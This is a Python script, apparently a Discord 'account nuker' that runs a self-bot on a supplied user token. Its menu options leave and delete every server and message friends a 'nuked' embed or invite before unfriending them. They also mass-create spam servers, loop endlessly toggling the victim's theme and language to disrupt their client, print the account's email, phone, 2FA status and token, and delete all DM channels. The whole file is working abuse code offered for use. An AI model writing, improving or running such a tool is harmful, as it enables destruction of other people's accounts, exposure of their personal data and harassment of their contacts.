import discord
import asyncio
import codecs
import sys
import io
import random
import threading
import requests
import discord
import os
import colorama
from discord.ext import commands
from discord.ext.commands import Bot
from colorama import Fore
from tqdm import tqdm, trange
from time import sleep 
import pyfiglet
from pyfiglet import Figlet
 
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
import subprocess
import requests
import time
import sys
import os
import json

os.system(f'cls &mode 75,19 & title Broken Token Discord')

bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")
 
token = input("Token >>> : ")
os.system("cls")
head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
 
if src.status_code == 200:
    print('[Token Valid]')
else:
    print('[Invalid Token]')
    input("Press Any Key To Exit...")
    exit(0)


print('\n')
print("""
 
\u001b[34;1m╔══════════════════════════════════════╦═══════════════════════════════╗
\u001b[34;1m║ \u001b[37m[1] > NUKE                           \u001b[34;1m║         \u001b[37m[4] > SPAM SERVERS    \u001b[34;1m║
\u001b[34;1m║ \u001b[37m[2] > DELETE AND LEAVE ALL SERVERS   \u001b[34;1m║         \u001b[37m[5] > TOKEN INFO      \u001b[34;1m║
\u001b[34;1m║ \u001b[37m[3] > CLOSE                          \u001b[34;1m║         \u001b[37m[6] > DISCORD CRASHER \u001b[34;1m║
\u001b[34;1m║                                      \u001b[34;1m║                               \u001b[34;1m║
\u001b[34;1m╚══════════════════════════════════════╩═══════════════════════════════╝

	""")
 
 
def nuke():
    print("Loading...")
    print('\n')
 
    @bot.event
    async def on_ready(times: int = 20):
 
        print('STATUS : [NUKE]')
        print('\n')
        print('1  \u001b[31;1mLEAVING SERVERS \u001b[32msucceed...')
        print('\n')
 
        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left [{guild.name}]')
            except:
                print(f'CANT LEAVE [{guild.name}]')
        print('\n')
        print('2 - DELETING OWNED SERVERS')
        print('\n')
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'\u001b[31;1mDeleted sever\u001b[37m[{guild.name}] \u001b[32msucceed... ')
            except:
                print(f'CANT DELETE [{guild.name}]')
 
        print('\n')
        print('3 - REMOVING ALL FRIENDS')
        print('\n')
 
        for user in bot.user.friends:
            try:
                await user.dm_channel.send('https://discord.gg/mUZYqtE8zb')
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"CAN'T UNFRIEND {user}")
 
        print('\n')
        print('4 - SPAMMING SERVERS')
        print('\n')
 
        for i in range(times):
            await bot.create_guild('Grovegod Team', region=None, icon=None)
            print(f'{i} \u001b[31;1mCreated server \u001b[32mSucceed')
        print('\n')
        print('Max server limit is [20]')
        print('\n')
        print('\n')
        print('5 - CRASHING DISCORD')
        print('\n')
 
        print('\n')
        print("CRASHING THE TOKEN OWNER'S DISCORD...")
        print(
            'IF YOU WANNA KEEP GIVING TOKEN OWNER A STROKE THEN KEEP THIS FILE RUNNING'
        )        
        headers = {'Authorization': token}
        modes = cycle(["light", "dark"])
        while True:
            setting = {
                'theme': next(modes),
                'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
            }
            requests.patch(
                "https://discord.com/api/v6/users/@me/settings",
                headers=headers,
                json=setting)
               
    bot.run(token, bot=False)


def unfriender():
    print("Loading...")
 
    @bot.event
    async def on_ready():
        print('STATUS : [UNFRIENDER]')
 
        for user in bot.user.friends:
            try:
                embed=discord.Embed(title="Nuking Account", description="Ex Nuker V2", color=0x0000ff) 
                embed.set_author(name="Account Nuked") 
                embed.set_footer(text="Excailbur Taking Over")
                embed.set_image(url="https://discord.com/channels/928683558497837088/928684628439629834/934712914693201940") 
                await user.dm_channel.send(embed=embed)
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"CAN'T UNFRIEND {user}")
 
        print('\n')
        print(
            '[UNFRIENDING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')
 
    bot.run(token, bot=False)     
    
    
#### server leaver
def leaver():
    print("Loading...")
    #bot.logout
 
    @bot.event
    async def on_ready():
        print('STATUS : [SERVER LEAVER]')
 
        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left [{guild.name}]')      
            except:
                print(f'DELETE  Failed [{guild.name}]')
 
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'\u001b[31;1mDelete sever\u001b[37m[{guild.name}] \u001b[32msucceed...')
            except:
                print(f"CAN'T DELETE [{guild.name}]")
 
        print('\n')      
        print('[LEAVING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n') 

    bot.run(token, bot=False)


#### spam servers
def spamservers():
    print("Loading...")
 
    @bot.event
    async def on_ready(times: int = 20):
        print('STATUS : [SERVER SPAMMER]')
 
        for i in range(times):
            await bot.create_guild( 
                'PLUEMSIZE#9999', region=None, icon=None)
            print(f'{i} \u001b[31;1mSpam server \u001b[32mSucceed')
 
        print('max server limit is [20]')
        print('\n')
        print('[SPAMMING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')
        input()            
       
    bot.run(token, bot=False)
 
 
def tokenInfo(token):
    print('STATUS : [TOKEN INFO]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f'''     
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]     {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
            [{Fore.RED}Email{Fore.RESET}]           {email}
	    [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
        input()
 
 
def crash_discord(token):
    print('STATUS : [DISCORD CRASHER]')
    print('\n')
    print('\u001b[31;1mBroken \u001b[32mSucceed')
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
        }
        requests.patch(
            "https://discord.com/api/v6/users/@me/settings",
            headers=headers,
            json=setting)
 
def closeDm(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()              
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,
        )

    bot.run(token, bot=False)

 
def mainanswer():
 
    answer = input('\033[1;00m[\033[91mRun\033[1;00m]-\033[91m\033[00m Choose : ')
    if answer == '1':
        nuke()
	    
        

    elif answer == '2':
        leaver()
	       

    elif answer == '4':
        spamservers()
	    

    elif answer == '5':
        tokenInfo(token)
	    

    elif answer == '6':
        crash_discord(token)
	    

    elif answer == '3':
        closeDm(token)
	    

    else:
        print('Incorrect selection, please choose a number')
        mainanswer()
        

mainanswer()                                               